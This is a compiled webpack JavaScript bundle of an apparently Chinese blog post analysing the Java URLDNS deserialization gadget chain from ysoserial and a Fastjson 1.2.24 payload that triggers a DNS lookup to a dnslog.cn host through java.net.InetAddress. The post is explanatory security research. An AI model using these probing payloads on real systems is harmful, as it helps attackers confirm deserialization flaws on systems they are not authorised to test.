(window.webpackJsonp=window.webpackJsonp||[]).push([[51],{354:function(a,s,e){"use strict";e.r(s);var t=e(22),r=Object(t.a)({},(function(){var a=this,s=a.$createElement,e=a._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h2",{attrs:{id:"java反序列化中的urldns链"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#java反序列化中的urldns链"}},[a._v("#")]),a._v(" Java反序列化中的URLDNS链")]),a._v(" "),e("p",[e("em",[e("strong",[a._v("1.先看一下ysoserial的生成urldns的payload的代码")])]),a._v(" "),e("img",{attrs:{src:"/java/urldns/java_urldns.jpg",alt:""}})]),a._v(" "),e("p",[e("em",[e("strong",[a._v("2.payload生成过程:")])])]),a._v(" "),e("ul",[e("li",[a._v("初始化一个hashmap实例: HashMap ht = new HashMap();")]),a._v(" "),e("li",[a._v("初始化URL实例 : URL u = new URL(null, url, handler);")]),a._v(" "),e("li",[a._v("将URL的实例作为key传入hashmap中: ht.put(u, url);")]),a._v(" "),e("li",[a._v('通过暴力反射将URL实例中的hashCode设置为-1 : Reflections.setFieldValue(u, "hashCode", -1);')]),a._v(" "),e("li",[a._v("将hashmap序列化得到payload")])]),a._v(" "),e("p",[e("em",[e("strong",[a._v("3.反序列化过程")])])]),a._v(" "),e("ul",[e("li",[e("p",[a._v("objectInputStream.readObject --\x3e hashmap.readObject")]),a._v(" "),e("ul",[e("li",[a._v('ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("./dnslog.obj"));')]),a._v(" "),e("li",[a._v("Object o = objectInputStream.readObject();")])])]),a._v(" "),e("li",[e("p",[a._v("跟进hashmap的readobject方法\n"),e("img",{attrs:{src:"/java/urldns/urldns_java_hashmap_readohject.jpg",alt:""}})])]),a._v(" "),e("li",[e("p",[a._v("进入hash(key),这里的key就是对应的URL的实例对象")])])]),a._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("static final int hash(Object key) {\n    int h;\n    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  //key对象这里对应的就是URL的实例对象\n}\n")])])]),e("ul",[e("li",[a._v("进入URL@hashCode()方法,发现只有hashCode为 -1 时才能进入hashCode(this)方法,说明构造payload时设置hashCode的原因")])]),a._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v("public synchronized int hashCode() {\n    if (hashCode != -1)\n        return hashCode;\n\n    hashCode = handler.hashCode(this);\n    return hashCode;\n}\n")])])]),e("ul",[e("li",[a._v("跟进hashCode(this)方法,发现这里就触发了域名的解析功能\n"),e("img",{attrs:{src:"/java/urldns/urldns_dnslookup.jpg",alt:""}})])]),a._v(" "),e("h2",{attrs:{id:"fastjson反序列化中的urldns链"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#fastjson反序列化中的urldns链"}},[a._v("#")]),a._v(" Fastjson反序列化中的URLDNS链")]),a._v(" "),e("p",[e("em",[e("strong",[a._v("1.先看一下fastjson的payload的代码 fastjson1.2.24 以InetAddress为例")])])]),a._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v('String payload ="{\\"rand1\\":{\\"@type\\":\\"java.net.InetAddress\\",\\"val\\":\\"abcd.oi00cm.dnslog.cn\\"}}";\nObject parse = JSON.parse(payload);\n')])])]),e("p",[e("em",[e("strong",[a._v("2.分析流")])])]),a._v(" "),e("h4",{attrs:{id:"截取部分"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#截取部分"}},[a._v("#")]),a._v(" 截取部分")]),a._v(" "),e("ul",[e("li",[e("p",[a._v("com.alibaba.fastjson.parser.ParserConfig(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)\n"),e("img",{attrs:{src:"/java/urldns/fastjson_dnslog.jpg",alt:""}})])]),a._v(" "),e("li",[e("p",[a._v("com.alibaba.fastjson.serializer.MiscCodec.deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)\n"),e("img",{attrs:{src:"/java/urldns/fastjson_dnslog_go.jpg",alt:""}})])])]),a._v(" "),e("p",[e("em",[e("strong",[a._v("3.总结")])])]),a._v(" "),e("p",[e("code",[a._v("fastjson认为dnslog的请求是无害化的,也确实是无害的,因此针对dnslog类的处理跟其他的rce模式略为不一样")])]),a._v(" "),e("p",[e("code",[a._v("dnslog类作为fastjson缓存白名单模式,方便加快序列化从而造成了问题")])])])}),[],!1,null,null,null);s.default=r.exports}}]);